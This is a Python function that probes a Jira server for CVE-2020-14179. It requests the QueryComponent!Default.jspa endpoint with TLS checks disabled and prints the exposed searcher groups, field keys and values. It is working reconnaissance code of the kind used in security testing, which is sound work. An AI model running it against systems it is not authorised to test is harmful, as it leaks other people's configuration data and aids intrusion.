import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
from urllib.parse import urlparse
import urllib3

def check_cve_2020_14179(url):
    cve202014179_url = f"{url.rstrip('/')}/secure/QueryComponent!Default.jspa"
    #  rest/secure/QueryComponent!Default.jspa might also work 
    vulnerabilities = ""
    headers = {
        'X-Atlassian-Token': 'no-check'
    }

    try:
        print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2020-14179{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {cve202014179_url}")
        response = requests.get(cve202014179_url, headers=headers, allow_redirects=False, verify=False)

        if response.status_code == 200 and "searchers" in response.text:
            vulnerabilities += f"+ [Info Disclosure] CVE-2020-14179: Sensitive information exposed at {cve202014179_url}"

            data = response.json()

            # Process "searchers" field
            searchers_groups = data.get("searchers", {}).get("groups", [])
            print(f"\n{Fore.GREEN}+ [Info Disclosure] CVE-2020-14179 Detected: Searchers Information  [Review Manually]{Style.RESET_ALL}")
            print(f"  URL: {cve202014179_url}")
            for group in searchers_groups:
                group_title = group.get("title", "Unknown Group")
                group_type = group.get("type", "Unknown Type")
                print(f"\n  Group Title: {group_title} | Type: {group_type}")

                for searcher in group.get("searchers", []):
                    name = searcher.get("name", "Unknown Name")
                    searcher_id = searcher.get("id", "Unknown ID")
                    key = searcher.get("key", "Unknown Key")
                    is_shown = searcher.get("isShown", False)
                    print(f"    - Name: {name}")
                    print(f"      ID: {searcher_id}")
                    print(f"      Key: {key}")
                    print(f"      Is Shown: {is_shown}")

            # Process "values" field
            values = data.get("values", {})
            #for discovered_values in values:
                #print(discovered_values)
            print(f"\n{Fore.GREEN}+ [Info Disclosure] - CVE-2020-14179 Detected: Values Information [Review Manually]{Style.RESET_ALL}")
            print(f"  URL: {cve202014179_url}")
            
            for key, value in values.items():
                name = value.get("name", "Unknown Name")
                valid_searcher = value.get("validSearcher", False)
                is_shown = value.get("isShown", False)
                edit_html = value.get("editHtml", "No Edit HTML Provided")
                project = value.get("project", "No Edit HTML Provided")
                print(f"\n  Field: {key}")
                print(f"    - Name: {name}")
                print(f"    - Valid Searcher: {valid_searcher}")
                print(f"    - Is Shown: {is_shown}")
                print(f"    - Edit HTML (First 100 chars): {edit_html[:100]}...")  # Truncate for display
                
        elif response.status_code == 403:
            print(f"{Fore.YELLOW}\n- Access denied to {cve202014179_url}. CVE-2020-14179 may not apply.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}\n- No CVE-2020-14179 vulnerability detected at {cve202014179_url}.{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}- Failed to parse JSON response from {cve202014179_url}.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred: {e}{Style.RESET_ALL}")

    return vulnerabilities
